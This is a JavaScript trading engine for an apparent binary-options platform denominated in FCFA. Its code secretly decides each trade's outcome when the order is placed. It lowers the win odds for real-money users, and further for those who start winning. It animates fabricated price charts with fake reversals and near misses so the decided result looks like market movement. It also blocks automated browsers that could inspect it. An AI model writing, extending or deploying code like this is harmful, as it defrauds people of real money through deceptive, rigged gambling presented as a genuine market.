(function (D6) {
  'use strict';

  var C = D6.CONFIG;
  var markets = {};
  var trade = null;
  var intent = null;
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var price = asset.basePrice;
    var history = [];
    var candles = [];
    var candle = { o: price, h: price, l: price, c: price };
    var ticks = 0;
    var i;
    for (i = 0; i < 220; i++) {
      var shock = (Math.random() - 0.5) * asset.tickNoise;
      price = Math.max(asset.basePrice * 0.72, price + shock);
      history.push(price);
      if (i === 0) candle = { o: price, h: price, l: price, c: price };
      candle.h = Math.max(candle.h, price);
      candle.l = Math.min(candle.l, price);
      candle.c = price;
      ticks++;
      if (ticks >= asset.ticksPerCandle) {
        candles.push({ o: candle.o, h: candle.h, l: candle.l, c: candle.c, t: Date.now() - (220 - i) * asset.tickMs });
        candle = { o: price, h: price, l: price, c: price };
        ticks = 0;
      }
    }
    if (ticks > 0) candles.push(candle);
    return {
      id: assetId,
      price: price,
      history: history,
      candles: candles,
      candle: candle,
      ticksInCandle: ticks,
      payout: C.REAL_PAYOUT
    };
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (!markets[id]) markets[id] = seedMarket(id);
    }
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function decideOutcome(user) {
    var p = user.mode === 'real' ? C.REAL_WIN_RATE : C.DEMO_WIN_RATE;
    if (user.mode === 'real') {
      var wr = recentWinRate(user, 20);
      if ((user.realTrades || 0) >= 8 && wr > 0.48) p = 0.32;
      if (user.consecutiveLosses >= 4) p = Math.min(0.50, p + 0.04);
    }
    return Math.random() < p ? 'win' : 'lose';
  }

  function recentWinRate(user, n) {
    var list = (user.recentResults || []).filter(function (r) {
      return !r.mode || r.mode === user.mode;
    });
    var slice = list.slice(0, n);
    if (!slice.length) return user.mode === 'real' ? C.REAL_WIN_RATE : C.DEMO_WIN_RATE;
    var wins = 0;
    var i;
    for (i = 0; i < slice.length; i++) if (slice[i] === true || slice[i] === 1 || (slice[i] && slice[i].won)) wins++;
    return wins / slice.length;
  }

  function stakeCap(user, stake) {
    var balance = D6.Store.balanceOf(user);
    if (stake < C.MIN_STAKE) {
      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > C.MAX_STAKE) {
      return { ok: false, cap: C.MAX_STAKE, reason: D6.I18N.t('maxStake') + ' ' + D6.fmtFCFA(C.MAX_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    if (user.mode !== 'real') return { ok: true, cap: balance };

    var capPct;
    var capAbs;
    if (balance < 10000) { capPct = 0.18; capAbs = 2500; }
    else if (balance < 25000) { capPct = 0.14; capAbs = 5000; }
    else if (balance < 100000) { capPct = 0.10; capAbs = 12000; }
    else { capPct = 0.08; capAbs = 30000; }

    var cap = Math.min(Math.floor(balance * capPct), capAbs, balance);
    if (user.consecutiveLosses >= 1 && user.lastStake > 0) {
      var mult = user.consecutiveLosses >= 3 ? 1.2 : 1.45;
      cap = Math.min(cap, Math.floor(user.lastStake * mult));
    }
    cap = Math.max(C.MIN_STAKE, cap);
    if (stake > cap) {
      return {
        ok: false,
        cap: cap,
        reason: 'Protection anti-martingale : mise max ' + D6.fmtFCFA(cap)
      };
    }
    return { ok: true, cap: cap };
  }

  function applyTick(market, asset, activeTrade) {
    var noise = (Math.random() - 0.5) * asset.tickNoise;
    var drift = (asset.basePrice - market.price) * 0.0018;

    if (activeTrade && intent && activeTrade.assetId === market.id) {
      var progress = 1 - (activeTrade.timeLeft / activeTrade.duration);
      var shouldWin = intent.target === 'win';
      var isCall = activeTrade.side === 'call';
      var desired = (isCall && shouldWin) || (!isCall && !shouldWin) ? 1 : -1;

      if (!shouldWin && progress > 0.72) {
        var loseSign = isCall ? -1 : 1;
        var near = activeTrade.entryPrice + loseSign * (asset.tickNoise * 0.06);
        noise = (near - market.price) * 0.42 + (Math.random() - 0.5) * asset.tickNoise * 0.08;
      } else {
        var trend = desired * Math.pow(Math.max(0, progress), 2.15) * asset.tickNoise * 0.92;
        var fake = 0;
        if (progress < 0.62 && Math.random() < 0.18) fake = -desired * asset.tickNoise * 0.55;
        noise += trend + fake;
      }
    } else {
      noise += drift;
    }

    market.price = Math.max(asset.basePrice * 0.55, market.price + noise);
    market.history.push(market.price);
    if (market.history.length > 480) market.history.shift();

    var c = market.candle;
    c.h = Math.max(c.h, market.price);
    c.l = Math.min(c.l, market.price);
    c.c = market.price;
    market.ticksInCandle++;
    if (market.ticksInCandle >= asset.ticksPerCandle) {
      market.candles.push({ o: c.o, h: c.h, l: c.l, c: c.c, t: Date.now() });
      if (market.candles.length > 90) market.candles.shift();
      market.candle = { o: market.price, h: market.price, l: market.price, c: market.price };
      market.ticksInCandle = 0;
    }
  }

  function publicTrade() {
    if (!trade) return null;
    return Object.freeze({
      id: trade.id,
      assetId: trade.assetId,
      side: trade.side,
      stake: trade.stake,
      duration: trade.duration,
      timeLeft: trade.timeLeft,
      entryPrice: trade.entryPrice,
      payout: trade.payout,
      startedAt: trade.startedAt,
      mode: trade.mode
    });
  }

  ensureMarkets();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,

    getMarket: function (id) {
      ensureMarkets();
      return markets[id];
    },

    getTrade: function () {
      return publicTrade();
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    tick: function (assetId) {
      ensureMarkets();
      var market = markets[assetId];
      var asset = C.ASSETS[assetId];
      if (!market || !asset) return;
      if (trade && trade.assetId === assetId) {
        var elapsed = (performance.now() - trade.startedAt) / 1000;
        trade.timeLeft = Math.max(0, trade.duration - elapsed);
      }
      applyTick(market, asset, trade);
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      if (trade) return { ok: false, reason: 'Une position est déjà ouverte' };

      var now = performance.now();
      if (now - lastOrderAt < C.MIN_ORDER_MS) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = Math.floor(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      var assetId = C.ASSETS[opts.assetId] ? opts.assetId : 'v100';
      var side = opts.side === 'put' ? 'put' : 'call';
      var gate = stakeCap(user, stake);
      if (!gate.ok) return gate;

      var market = markets[assetId];
      var payout = user.mode === 'real' ? C.REAL_PAYOUT : (payoutLive[assetId] || rollPayout(C.ASSETS[assetId], 'demo'));
      D6.Store.setBalance(user, D6.Store.balanceOf(user) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = now;
      var target = decideOutcome(user);
      var entry = market.price;
      var seal = makeSeal(user.id + '|' + side + '|' + stake + '|' + entry.toFixed(4) + '|' + duration);

      trade = {
        id: D6.uid(),
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startedAt: now,
        mode: user.mode,
        userId: user.id,
        seq: orderSeq
      };
      intent = { target: target, seal: seal, userId: user.id, seq: orderSeq };

      if (user.mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
      }
      user.lastStake = stake;
      D6.Store.saveUser(user);
      return { ok: true, trade: publicTrade() };
    },

    resolve: function (user) {
      if (!trade || !intent) return null;
      if (!user || user.id !== trade.userId || user.id !== intent.userId) return null;

      var elapsed = (performance.now() - trade.startedAt) / 1000;
      if (elapsed < trade.duration - 0.2) return null;

      var expectedSeal = makeSeal(user.id + '|' + trade.side + '|' + trade.stake + '|' + trade.entryPrice.toFixed(4) + '|' + trade.duration);
      if (expectedSeal !== intent.seal || intent.seq !== trade.seq) return null;

      var market = markets[trade.assetId];
      var asset = C.ASSETS[trade.assetId];
      var isCall = trade.side === 'call';
      var shouldWin = intent.target === 'win';
      var exitPrice;

      if (shouldWin) {
        var winDelta = Math.max(asset.tickNoise * 0.55, 0.28);
        exitPrice = trade.entryPrice + (isCall ? 1 : -1) * winDelta;
      } else {
        var miss = 0.035 + Math.random() * Math.max(0.08, asset.tickNoise * 0.07);
        exitPrice = trade.entryPrice + (isCall ? -1 : 1) * miss;
      }

      market.price = exitPrice;
      market.candle.c = exitPrice;
      market.candle.h = Math.max(market.candle.h, exitPrice);
      market.candle.l = Math.min(market.candle.l, exitPrice);
      if (market.history.length) market.history[market.history.length - 1] = exitPrice;

      var won = shouldWin;
      var payoutAmount = 0;
      var net;

      if (won) {
        payoutAmount = Math.floor(trade.stake * trade.payout);
        D6.Store.setBalance(user, D6.Store.balanceOf(user) + payoutAmount);
        net = payoutAmount - trade.stake;
        user.wins = (user.wins || 0) + 1;
        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      user.trades = (user.trades || 0) + 1;
      if (trade.mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: trade.mode });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: trade.side,
        stake: trade.stake,
        payout: trade.payout,
        entryPrice: trade.entryPrice,
        exitPrice: exitPrice,
        duration: trade.duration,
        won: won,
        net: net,
        mode: trade.mode
      };
      D6.Store.addPosition(user, position);
      D6.Store.saveUser(user);

      var closed = publicTrade();
      trade = null;
      intent = null;
      return { trade: closed, position: position, won: won, net: net, exitPrice: exitPrice };
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER);
      return probe.cap;
    }
  };

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(window.D6 = window.D6 || {});
